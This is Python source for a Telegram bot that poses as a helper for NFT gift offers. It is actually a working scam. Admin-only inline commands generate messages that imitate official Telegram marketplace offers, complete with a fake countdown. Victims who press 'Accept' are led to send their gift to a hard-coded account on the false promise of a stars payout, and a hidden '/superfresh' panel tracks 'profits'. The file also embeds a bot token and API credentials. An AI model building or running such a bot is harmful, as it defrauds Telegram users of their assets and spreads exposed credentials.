import re
import asyncio
from datetime import datetime, timedelta, timezone

from telethon import TelegramClient, events, Button

# ============================================================
# НАСТРОЙКИ БОТА
# ============================================================
BOT_TOKEN = '8678934015:AAFgRKc0B96xz8ruIhy0wjpUJvCSuXzuAYI'
SESSION_NAME = 'nft_offer_bot2'

# ВАШ ID
ADMIN_IDS = [1337523893, 8429886245] 

client = TelegramClient(SESSION_NAME, api_id=26801818, api_hash='12b544be3626dd72f50af9b3087ebc23')

active_offers: dict = {}
user_settings: dict = {}

# ============================================================
# ТЕКСТЫ
# ============================================================
TEXTS = {
    'ru': {
        'choose_lang': "🇷🇺 Выберите язык / Choose your language 🇬🇧",
        'welcome': (
            "👋 Добро пожаловать в **NFT Offers Bot**!\n\n"
            "Этот бот предназначен для безопасного обмена предложениями (офферами) на покупку "
            "коллекционных NFT-подарков в Telegram.\n\n"
            "⚠️ **Обратите внимание:** отправка офферов доступна только через встроенный маркет Telegram. "
            "Бот является вспомогательным инструментом для фиксации сделок и получения инструкций."
        ),
        'btn_how': "❓ Как отправить оффер?",
        'btn_lang': "🌐 Поменять язык",
        'btn_history': "📜 История",
        'btn_back': "⬅️ Назад",
        'btn_profits': "💰 Профиты",
        'btn_settings': "⚙️ Настройки",
        'how_to': (
            "📖 **Инструкция по отправке оффера:**\n\n"
            "1. Найдите нужный вам NFT-подарок на маркете Telegram.\n"
            "2. Нажмите на три точки (⋮) рядом с подарком.\n"
            "3. Выберите кнопку с оффером (Сделать предложение) и укажите вашу цену в Stars или GRAM.\n\n"
            "После того как продавец примет ваше предложение, Telegram автоматически уведомит вас."
        ),
        'history_empty': "📭 У вас пока нет истории офферов.",
        'unauthorized_inline': "Воспользуйтесь маркетом телеграм для отправки оффера.",
        'secret_menu': (
            "🕵️‍♂️ **Скрытая панель управления (Superfresh)**\n\n"
            "Добро пожаловать в расширенное меню. Здесь вы можете управлять настройками вашего "
            "аккаунта в боте, просматривать скрытую историю профитов и настраивать уведомления."
        ),
        'notif_on': "🔔 Уведомления ВКЛ",
        'notif_off': "🔕 Уведомления ВЫКЛ",
        'notif_status': "Уведомления о нажатиях кнопок на ваши офферы: **{}**",
        'offer_accepted_notif': "✅ Покупатель принял ваш оффер на **{gift_name}**! Передайте подарок для получения звёзд.",
        'offer_declined_notif': "❌ Покупатель отклонил ваш оффер на **{gift_name}**.",
    },
    'eng': {
        'choose_lang': "🇷🇺 Выберите язык / Choose your language 🇬🇧",
        'welcome': (
            "👋 Welcome to **NFT Offers Bot**!\n\n"
            "This bot is designed for the safe exchange of offers for purchasing "
            "collectible NFT gifts in Telegram.\n\n"
            "⚠️ **Please note:** sending offers is only available through the built-in Telegram market. "
            "The bot is an auxiliary tool for fixing deals and getting instructions."
        ),
        'btn_how': "❓ How to send an offer?",
        'btn_lang': "🌐 Change language",
        'btn_history': "📜 History",
        'btn_back': "⬅️ Back",
        'btn_profits': "💰 Profits",
        'btn_settings': "⚙️ Settings",
        'how_to': (
            "📖 **How to send an offer:**\n\n"
            "1. Find the NFT gift you need on the Telegram market.\n"
            "2. Tap the three dots (⋮) next to the gift.\n"
            "3. Select the offer button (Make an offer) and specify your price in Stars or GRAM.\n\n"
            "Once the seller accepts your offer, Telegram will automatically notify you."
        ),
        'history_empty': "📭 You have no offer history yet.",
        'unauthorized_inline': "Use the Telegram marketplace to send an offer.",
        'secret_menu': (
            "🕵️‍♂️ **Hidden Control Panel (Superfresh)**\n\n"
            "Welcome to the advanced menu. Here you can manage your "
            "account settings, view hidden profit history, and configure notifications."
        ),
        'notif_on': "🔔 Notifications ON",
        'notif_off': "🔕 Notifications OFF",
        'notif_status': "Notifications on button clicks for your offers: **{}**",
        'offer_accepted_notif': "✅ The buyer accepted your offer for **{gift_name}**! Transfer the gift to receive stars.",
        'offer_declined_notif': "❌ The buyer declined your offer for **{gift_name}**.",
    }
}

def get_lang(user_id):
    return user_settings.get(user_id, {}).get('lang', 'ru')

def get_text(user_id, key):
    return TEXTS[get_lang(user_id)][key]


# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ПАРСИНГ И ОФФЕР)
# ============================================================

def parse_buy_command(text: str):
    clean_text = text.strip().replace('\u200b', '').replace('\xa0', ' ')
    
    pattern = r'\.buy\s+(ru|eng)\s+(https?://\S+)\s+(\d+)\s+(stars|GRAM)'
    match = re.search(pattern, clean_text, re.IGNORECASE)
    
    if not match:
        return None
        
    lang, link, price_str, currency = match.groups()
    price = int(price_str)
    currency = currency.upper()

    gift_slug = link.split('/')[-1]
    if '-' in gift_slug:
        name_part, num_part = gift_slug.rsplit('-', 1)
        name_with_spaces = re.sub(r'([a-z])([A-Z])', r'\1 \2', name_part)
        gift_name = f"{name_with_spaces} #{num_part}"
    else:
        gift_name = gift_slug

    return {'lang': lang.lower(), 'link': link, 'price': price, 'currency': currency, 'gift_name': gift_name}


def build_offer_text(offer_data: dict, expires_at: datetime) -> str:
    price_str = f"{offer_data['price']} stars" if offer_data['currency'] == 'STARS' else f"{offer_data['price']} GRAM"
    gift_name = offer_data['gift_name']
    link = offer_data['link']
    
    months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
    month_str = months[expires_at.month - 1]
    time_str = expires_at.strftime("%H:%M")
    date_str = f"{expires_at.day} {month_str} {time_str} UTC"
    gift_link = f"[{gift_name}]({link})"

    return (
        f"👤 Пользователь отправил вам оффер на {gift_link}\n"
        f"⭐ Сумма оффера: {price_str}.\n"
        f"📝 За подарок: {gift_link}\n"
        f"⏳ Длительность: 5h 59m 59s\n"
        f"⏰ До: {date_str}"
    )


def build_offer_buttons(offer_id: str, lang: str):
    if lang == 'ru':
        accept_text, reject_text = "✓ Принять", "⊗ Отклонить"
    else:
        accept_text, reject_text = "✓ Accept", "⊗ Decline"
        
    return [
        [
            Button.inline(accept_text, data=f"offer_accept:{offer_id}".encode()),
            Button.inline(reject_text, data=f"offer_reject:{offer_id}".encode()),
        ]
    ]


# ============================================================
# ОБРАБОТЧИК /START И ГЛАВНОЕ МЕНЮ
# ============================================================

@client.on(events.NewMessage(pattern='/start'))
async def handle_start(event: events.NewMessage.Event):
    buttons = [
        [Button.inline("🇷🇺 Русский", data=b"set_lang_ru"), Button.inline("🇬🇧 English", data=b"set_lang_eng")]
    ]
    await event.respond(TEXTS['ru']['choose_lang'], buttons=buttons)


@client.on(events.CallbackQuery(pattern=b'^set_lang_'))
async def set_language(event: events.CallbackQuery.Event):
    lang = event.data.decode().replace('set_lang_', '')
    user_id = event.sender_id
    
    if user_id not in user_settings:
        user_settings[user_id] = {'notifications': True}
    user_settings[user_id]['lang'] = lang
    
    buttons = [
        [Button.inline(get_text(user_id, 'btn_how'), data=b"menu_how")],
        [
            Button.inline(get_text(user_id, 'btn_lang'), data=b"menu_lang"),
            Button.inline(get_text(user_id, 'btn_history'), data=b"menu_history")
        ]
    ]
    await event.edit(get_text(user_id, 'welcome'), buttons=buttons, parse_mode='md')


@client.on(events.CallbackQuery(pattern=b'^menu_'))
async def menu_handler(event: events.CallbackQuery.Event):
    action = event.data.decode().replace('menu_', '')
    user_id = event.sender_id
    
    if action == 'how':
        buttons = [[Button.inline(get_text(user_id, 'btn_back'), data=b"menu_back")]]
        await event.edit(get_text(user_id, 'how_to'), buttons=buttons, parse_mode='md')
    elif action == 'history':
        buttons = [[Button.inline(get_text(user_id, 'btn_back'), data=b"menu_back")]]
        await event.edit(get_text(user_id, 'history_empty'), buttons=buttons, parse_mode='md')
    elif action == 'lang':
        buttons = [
            [Button.inline("🇷🇺 Русский", data=b"set_lang_ru"), Button.inline("🇬🇧 English", data=b"set_lang_eng")]
        ]
        await event.edit(TEXTS['ru']['choose_lang'], buttons=buttons)
    elif action == 'back':
        buttons = [
            [Button.inline(get_text(user_id, 'btn_how'), data=b"menu_how")],
            [
                Button.inline(get_text(user_id, 'btn_lang'), data=b"menu_lang"),
                Button.inline(get_text(user_id, 'btn_history'), data=b"menu_history")
            ]
        ]
        await event.edit(get_text(user_id, 'welcome'), buttons=buttons, parse_mode='md')


# ============================================================
# ОБРАБОТЧИК INLINE-ЗАПРОСА (ОГРАНИЧЕНИЕ ДОСТУПА)
# ============================================================

@client.on(events.InlineQuery)
async def handle_inline_query(event: events.InlineQuery.Event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_IDS:
        lang = get_lang(user_id)
        result = event.builder.article(
            title="Доступ ограничен" if lang == 'ru' else "Access restricted",
            description="",
            text=get_text(user_id, 'unauthorized_inline'),
            parse_mode='md',
        )
        await event.answer([result])
        return

    offer_data = parse_buy_command(event.text)
    if not offer_data:
        result = event.builder.article(
            title="❌ Неверный формат",
            description="Используйте: .buy <ru|eng> <ссылка> <цена> <stars|GRAM>",
            text="❌ Неверный формат команды.\nПример: `.buy ru https://t.me/ScaredCat-829 1000 stars`",
            parse_mode='md',
        )
        await event.answer([result])
        return

    offer_id = f"{event.sender_id}_{int(datetime.now().timestamp())}"
    
    expires_at = datetime.now(timezone.utc) + timedelta(hours=6)
    offer_text = build_offer_text(offer_data, expires_at)
    
    buttons = build_offer_buttons(offer_id, offer_data['lang'])

    result = event.builder.article(
        title=f"Оффер за {offer_data['price']} {offer_data['currency']}",
        description="Нажмите, чтобы отправить предложение в чат",
        text=offer_text,
        buttons=buttons,
        parse_mode='md',
        link_preview=True,
    )
    await event.answer([result])

    active_offers[offer_id] = {
        'offer_id': offer_id, 'lang': offer_data['lang'], 'gift_name': offer_data['gift_name'],
        'link': offer_data['link'], 'price': offer_data['price'], 'currency': offer_data['currency'],
        'sender_id': event.sender_id, 'status': 'pending',
        'created_at': datetime.now(), 'expires_at': expires_at,
    }


# ============================================================
# СЕКРЕТНАЯ КОМАНДА /superfresh
# ============================================================

@client.on(events.NewMessage(pattern='/superfresh'))
async def secret_menu(event: events.NewMessage.Event):
    user_id = event.sender_id
    if user_id not in ADMIN_IDS:
        return
    
    if user_id not in user_settings:
        user_settings[user_id] = {}
    if 'lang' not in user_settings[user_id]:
        user_settings[user_id]['lang'] = 'ru'
    if 'notifications' not in user_settings[user_id]:
        user_settings[user_id]['notifications'] = True

    notif_status = get_text(user_id, 'notif_on') if user_settings[user_id].get('notifications', True) else get_text(user_id, 'notif_off')

    buttons = [
        [Button.inline(get_text(user_id, 'btn_profits'), data=b"super_profits")],
        [Button.inline(notif_status, data=b"super_toggle_notif")],
        [Button.inline(get_text(user_id, 'btn_lang'), data=b"super_lang")]
    ]
    await event.respond(get_text(user_id, 'secret_menu'), buttons=buttons, parse_mode='md')


@client.on(events.CallbackQuery(pattern=b'^super_'))
async def super_menu_handler(event: events.CallbackQuery.Event):
    user_id = event.sender_id
    if user_id not in ADMIN_IDS: return
    
    action = event.data.decode().replace('super_', '')
    
    if action == 'toggle_notif':
        current = user_settings[user_id].get('notifications', True)
        user_settings[user_id]['notifications'] = not current
        
        notif_status = get_text(user_id, 'notif_on') if user_settings[user_id]['notifications'] else get_text(user_id, 'notif_off')
        buttons = [
            [Button.inline(get_text(user_id, 'btn_profits'), data=b"super_profits")],
            [Button.inline(notif_status, data=b"super_toggle_notif")],
            [Button.inline(get_text(user_id, 'btn_lang'), data=b"super_lang")]
        ]
        await event.edit(get_text(user_id, 'secret_menu'), buttons=buttons, parse_mode='md')
        
    elif action == 'profits':
        await event.answer("📊 История профитов пока пуста.", alert=True)
    elif action == 'lang':
        buttons = [
            [Button.inline("🇷🇺 Русский", data=b"set_lang_ru"), Button.inline("🇬🇧 English", data=b"set_lang_eng")]
        ]
        await event.edit(TEXTS['ru']['choose_lang'], buttons=buttons)


# ============================================================
# ОБРАБОТЧИКИ КНОПОК ОФФЕРА
# ============================================================

@client.on(events.CallbackQuery(pattern=b'^offer_(accept|reject):'))
async def handle_offer_response(event: events.CallbackQuery.Event):
    await event.answer()
    data = event.data.decode()
    action, offer_id = data.split(':', 1)

    offer = active_offers.get(offer_id)
    if not offer or offer['status'] != 'pending':
        await event.answer("❌ Предложение не найдено или уже обработано.", alert=True)
        return

    lang = offer['lang']
    seller_id = offer['sender_id']
    
    # Отправка уведомления создателю (если включены)
    if user_settings.get(seller_id, {}).get('notifications', False):
        seller_lang = get_lang(seller_id)
        notif_text_key = 'offer_accepted_notif' if action == 'offer_accept' else 'offer_declined_notif'
        notif_text = TEXTS[seller_lang][notif_text_key].format(gift_name=offer['gift_name'])
        try:
            await client.send_message(seller_id, notif_text, parse_mode='md')
        except Exception:
            pass

    if action == 'offer_accept':
        offer['status'] = 'accepted'
        
        success_text = (
            "✓ **Предложение принято!**\n\n"
            "Теперь вы можете перейти к отправке подарка.\n\n"
            "⭐ После отправки подарка баланс будет пополнен В tg://stars"
        )
        
        buttons = [
            [Button.url("Отправить подарок", "tg://send_gift?to=chozkaIiiil")]
        ]
        
        await event.edit(success_text, buttons=buttons, parse_mode='md', link_preview=True)
        
    elif action == 'offer_reject':
        offer['status'] = 'rejected'
        
        reject_text = "⊗ Оффер отклонён" if lang == 'ru' else "⊗ Offer declined"
        
        await event.edit(reject_text, buttons=None, parse_mode='md')


# ============================================================
# ЗАПУСК
# ============================================================

async def main():
    await client.start(bot_token=BOT_TOKEN)
    me = await client.get_me()
    print(f"✅ Бот запущен: @{me.username}")
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())